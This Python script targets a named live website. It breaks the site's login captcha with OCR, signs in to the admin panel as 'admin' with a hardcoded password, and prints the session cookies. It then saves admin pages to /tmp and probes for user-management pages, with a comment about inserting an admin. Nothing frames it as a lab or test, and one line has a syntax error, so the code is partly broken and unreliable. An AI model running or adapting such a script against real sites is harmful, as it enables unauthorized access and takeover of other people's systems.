import urllib.request, urllib.parse, io
import http.cookiejar, re
from PIL import Image
import pytesseract

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Captcha URL
cap_url = 'http://bjhzsv.com/main/inc/code.asp'

# Try multiple captcha attempts
for attempt in range(5):
    # Get captcha
    resp = opener.open(cap_url, timeout=10)
    cap_data = resp.read()
    
    # OCR
    img = Image.open(io.BytesIO(cap_data))
    # Convert to grayscale and threshold
    img = img.convert('L')
    img = img.point(lambda x: 0 if x < 200 else 255)
    code = pytesseract.image_to_string(img, config='--psm 8 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz').strip()
    code = code.replace(' ', '').lower()
    if not code:
        code = pytesseract.image_to_string(Image.open(io.BytesIO(cap_data)), config='--psm 8').strip().replace(' ', '').lower()
    
    print(f'Attempt {attempt+1}: Captcha OCR = {code}')
    
    if len(code) >= 3:
        # Try login with admin credentials
        login_url = 'http://bjhzsv.com/main/a7chkuser.asp'
        data = urllib.parse.urlencode({'t1': 'admin', 't2': '2d9d5942943a1323', 't3': code}).encode()
        resp = opener.open(login_url, data, timeout=10)
        body = resp.read().decode('gb2312', errors='replace')
        
        if '验证码错误' not in body and 'location.href' in body:
            print(f'SUCCESS! Captcha={code}')
            print(f'Response: {body[:300]}')
            # Save cookies
            for cookie in cj:
                print(f'Cookie: {cookie.name}={cookie.value}')
            
            # Try accessing admin panel
            resp2 = opener.open('http://bjhzsv.com/main/index.asp', timeout=10)
            body2 = resp2.read().decode('gb2312', errors='replace')
            print(f'Admin panel: {len(body2)} bytes')
            # Save the response
            with open('/tmp/admin_panel.html', 'w', encoding='utf-8') as f:
                f.write(body2)
            
            # Try news_in.asp
            resp3 = opener.open('http://bjhzsv.com/main/news_add.asp', timeout=10)
            body3 = resp3.read().decode('gb2312', errors='replace')
            with open('/tmp/admin_news_add.html', 'w', encoding='utf-8') as f:
                f.write(body3)
            print(f'News add page: {len(body3)} bytes - check /tmp/admin_news_add.html')
            
            # Try to insert admin
            # Check if user management exists
            for path in ['admin_add.asp', 'user_add.asp', 'manager_add.asp', 'admin_edit.asp', 'a7admin_add.asp']:
                try:
                    r = opener.open(f'http://bjhzsv.com/main/{path}', timeout=5)
                    b = r.read().decode('gb2312', errors='replace')
                    if 'location.href' not in b:
                        print(f'FOUND accessible page: {path} - {len(b)} bytes')
                        with open(f'/tmp/{path.replace(/,_)}', 'w', encoding='utf-8') as f:
                            f.write(b)
                except:
                    pass
            
            exit(0)
        else:
            print(f'Login failed. Response: {body[:200]}')

print('All login attempts failed')
